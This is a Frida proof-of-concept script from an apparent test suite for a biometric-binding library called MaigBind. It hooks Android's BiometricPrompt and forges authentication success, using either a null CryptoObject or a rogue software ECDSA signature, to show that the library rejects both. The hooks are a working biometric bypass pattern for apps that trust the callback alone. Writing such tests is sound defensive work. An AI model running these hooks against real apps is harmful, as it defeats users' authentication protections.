/**
 * MaigBind Attack Suite — Frida PoC: BiometricPrompt Callback Bypass (T1)
 *
 * Demonstrates why classic Universal Android Biometric Bypass scripts fail against MaigBind:
 *  - Mode "null_crypto": Invokes onAuthenticationSucceeded with a null CryptoObject
 *    -> maigbind-android detects `result.cryptoObject?.signature === expectedSignature` mismatch
 *       and returns `MaigBindError.CryptoObjectTampered`.
 *  - Mode "swapped_signature": Replaces the hardware-initialized Signature with an unauthenticated
 *    software ECDSA Signature -> maigbind-android rejects reference mismatch; even if bypassed in
 *    bytecode, maigbind-verifier rejects the forged signature with `SIGNATURE_INVALID`.
 *
 * Usage:
 *   frida -U -f io.github.maignardi.maigbind.sample.app -l bypass_biometric_callback.js
 */
'use strict';

const MODE = 'null_crypto'; // 'null_crypto' | 'swapped_signature'

Java.perform(function () {
    const BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
    const AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
    const CryptoObject = Java.use('androidx.biometric.BiometricPrompt$CryptoObject');
    const KeyPairGenerator = Java.use('java.security.KeyPairGenerator');
    const Signature = Java.use('java.security.Signature');

    let capturedCallback = null;

    const AuthCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
    AuthCallback.onAuthenticationSucceeded.implementation = function (result) {
        console.log('[Frida] Intercepted onAuthenticationSucceeded; cryptoObject=' + result.getCryptoObject());
        return this.onAuthenticationSucceeded(result);
    };

    BiometricPrompt.authenticate.overload(
        'androidx.biometric.BiometricPrompt$PromptInfo',
        'androidx.biometric.BiometricPrompt$CryptoObject'
    ).implementation = function (promptInfo, cryptoObj) {
        console.log('[Frida] Intercepted BiometricPrompt.authenticate(promptInfo, cryptoObject)');
        capturedCallback = this.mClientCallback ? this.mClientCallback.value : null;

        if (MODE === 'null_crypto') {
            console.log('[Frida] Forcing forged AuthenticationResult(null, 2) on callback...');
            if (capturedCallback) {
                const forged = AuthResult.$new(null, 2);
                capturedCallback.onAuthenticationSucceeded(forged);
                return;
            }
        } else if (MODE === 'swapped_signature') {
            console.log('[Frida] Generating rogue software P-256 Signature and forging CryptoObject...');
            if (capturedCallback) {
                const kpg = KeyPairGenerator.getInstance('EC');
                kpg.initialize(256);
                const rogueKey = kpg.generateKeyPair().getPrivate();
                const rogueSig = Signature.getInstance('SHA256withECDSA');
                rogueSig.initSign(rogueKey);
                const forgedCrypto = CryptoObject.$new(rogueSig);
                const forged = AuthResult.$new(forgedCrypto, 2);
                capturedCallback.onAuthenticationSucceeded(forged);
                return;
            }
        }

        return this.authenticate(promptInfo, cryptoObj);
    };
});
